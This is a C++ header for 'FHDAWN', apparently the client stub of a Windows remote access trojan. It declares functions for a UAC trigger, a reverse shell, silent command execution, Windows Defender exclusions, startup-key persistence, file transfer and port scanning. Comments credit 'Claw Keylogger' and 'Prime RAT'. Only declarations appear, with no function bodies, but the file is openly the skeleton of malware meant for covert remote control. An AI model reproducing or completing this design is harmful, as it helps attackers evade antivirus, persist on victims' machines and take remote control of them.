/*

FHDAWN - The Maalik Stub / Client
- Execute as Administrator 
- Add Exclusions to Install Directory
- [x] Browse the System.

*/

#ifndef FHDAWN_X
#define FHDAWN_X

#define BUFFER 1024
#define UNLEN 256

#include <winsock2.h>
#include <algorithm>
#include <tlhelp32.h>
#include <psapi.h>
#include <shlobj.h>
#include <iostream>
#include <tchar.h>
#include <winerror.h>
#include <sstream>
#include <fstream>
#include <string>
#include <windows.h>
#include <iphlpapi.h>

static bool connected = false;

void UACTrigger();

class FHDAWN{
    public:
    std::string SCANIP;
    int SCANPORT;
    std::string Host = "";
    std::string Port = "";
    SOCKET sockfd;
    std::string file_s;
    WIN32_FIND_DATA data;
    struct sockaddr_in server;
    char recvbuf[BUFFER] = { 0 };
    char fbuf[BUFFER] = { 0 } ;
    void MainConnect();
    void REConnect();
    void fhdawn_main();
    std::string OsInfo();
    void ExecuteSilent(const char* command); // From Claw Keylogger 
    void Execute(const char* file);
    void ExecuteArgs(const char* file, const char* args);
    void ReverseShell(const char* command); // Also from Claw Keylogger
    std::string readFileContents(const char* file); // Also from Claw Keylogger
    void send_data(std::string data);
    std::string Dir();
    void split(char* src, char* dest[5], const char* delimeter);
    BOOL isFile(const char* file);
    std::streampos filesize( const char* filePath );
    std::string UserPC();
    void copyFile(const char* source, const char* dest);
    std::string initial_install_directory(); // From Claw Keylogger
    void GetInformation(); // From Claw Keylogger
    std::istream& ignoreline(std::ifstream& in, std::ifstream::pos_type& pos); // From Claw Keylogger
    std::string getLastLine(std::ifstream& in); // From Claw Keylogger
    std::string MyLocation();  // From Claw Keylogger
    void StartupKey(const char* czExePath); // From Claw Keylogger
    BOOL IsAdmin();
    DWORD ProcessId(LPCTSTR ProcessName);
    void AddExclusion(const char* path); // Add Windows Defender Exclusion, From Prime RAT.
    void ProcessMonitor(std::string Process);
    void ReceiveFile();
    void checkPort(const char* ip, int port);
    std::string IP2Host(const char* IP);
    void CheckHost(const char* ip_address);
    std::string random_string(size_t length); // From Claw Keylogger
};

#endif
